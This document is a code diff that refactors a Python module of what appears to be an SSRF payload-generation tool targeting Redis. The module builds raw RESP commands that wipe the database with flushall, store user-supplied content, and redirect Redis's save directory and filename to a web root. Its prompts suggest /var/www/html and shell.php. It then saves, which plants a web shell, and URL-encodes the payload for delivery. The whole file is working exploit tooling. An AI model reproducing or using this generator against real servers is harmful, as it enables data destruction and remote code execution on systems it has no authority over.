@@ -1,84 +1,57 @@
 from .base import *
-import os
+from .encoding import to_bytes
+
+CRLF = b"\r\n"
+
+
+def resp_bulk(value):
+    data = to_bytes(value)
+    return b"$" + str(len(data)).encode("ascii") + CRLF + data + CRLF
+
+
+def resp_command(*parts):
+    command = b"*" + str(len(parts)).encode("ascii") + CRLF
+    command += b"".join(resp_bulk(part) for part in parts)
+    return command
+
 
 class Redis(GENERATOR):
+    default_port = 6379
     requirement = ["content", "dir", "filename"]
-    def __init__(self, parser,options={}):
-        if options["port"] == 0:
-            options["port"] = 6379
-        super().__init__(parser,options)
+
+    def __init__(self, parser, options=None):
+        super().__init__(parser, options)
         self.set_requirement(self.requirement)
         arg = self.get_requirement()
 
         if arg.dir == "":
-            self.dir = self.wizard_dir()
+            self.wizard("Directory (/var/www/html): ", "dir")
         else:
             self.dir = arg.dir
 
         if arg.filename == "":
-            self.filename = self.wizard_filename()
+            self.wizard("Filename (shell.php): ", "filename")
         else:
             self.filename = arg.filename
-        try:
-            with open(self.filename, "r") as f:
-                self.content = f.read()
-        except:
-            self.content = ""
-            if arg.content == "":
-                self.content = self.wizard_content()
-            else:
-                self.content = arg.content
+
+        if arg.content != "":
+            self.content = arg.content
+        else:
+            try:
+                with open(self.filename, "r") as f:
+                    self.content = f.read()
+            except (OSError, UnicodeDecodeError):
+                self.wizard("Content: ", "content")
 
     def generate(self):
-        content = self.content
-        dir = self.dir
-        filename = self.filename
-        redis_value = f"\n\n{content}\n\n"
-
-        payload = "".join([
-            "*1\r\n",
-            "$8\r\n",
-            "flushall\r\n",
-            "*3\r\n",
-            "$3\r\n",
-            "set\r\n",
-            "$1\r\n",
-            "1\r\n",
-            f"${len(redis_value)}\r\n",
-            redis_value,
-            "\r\n",
-            "*4\r\n",
-            "$6\r\n",
-            "config\r\n",
-            "$3\r\n",
-            "set\r\n",
-            "$3\r\n",
-            "dir\r\n",
-            f"${len(dir)}\r\n",
-            f"{dir}\r\n",
-            "*4\r\n",
-            "$6\r\n",
-            "config\r\n",
-            "$3\r\n",
-            "set\r\n",
-            "$10\r\n",
-            "dbfilename\r\n",
-            f"${len(filename)}\r\n",
-            f"{filename}\r\n",
-            "*1\r\n",
-            "$4\r\n",
-            "save\r\n",
+        redis_value = b"\n\n" + to_bytes(self.content) + b"\n\n"
+        payload = b"".join([
+            resp_command("flushall"),
+            resp_command("set", "1", redis_value),
+            resp_command("config", "set", "dir", self.dir),
+            resp_command("config", "set", "dbfilename", self.filename),
+            resp_command("save"),
         ])
 
-        self.set_mode(PAYLOAD_TYPE.QUOTE_PLUS).set_payload(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
+        self.set_url_payload(payload)
         return super().generate()
-
-    def wizard_content(self):
-        content = input("\033[96m" + "Content: " + "\033[0m")
-        return content
-    def wizard_filename(self):
-        filename = input("\033[96m" + "Filename (shell.php): " + "\033[0m")
-        return filename
-    def wizard_dir(self):
-        dir = input("\033[96m" + "Directory (/var/www/html): " + "\033[0m")
-        return dir
